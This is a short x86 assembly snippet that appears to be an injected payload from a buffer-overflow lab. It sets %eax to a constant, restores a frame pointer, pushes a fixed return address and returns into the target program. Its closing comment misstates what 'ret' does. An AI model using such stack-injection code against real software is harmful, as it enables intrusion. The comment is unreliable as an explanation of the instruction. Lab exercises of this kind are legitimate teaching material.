movl	$0x5516f6f3, %eax
leal	24(%esp), %edx		# edx = old ebp
movl	$0xdeadbeef, -4(%edx)
movl	$0x4, (%esp)
movl	%edx, %ebp
pushl	$0x8048f0e
ret
# ret means:
#	mov 8(%ebp), %esp
#	pop %ebp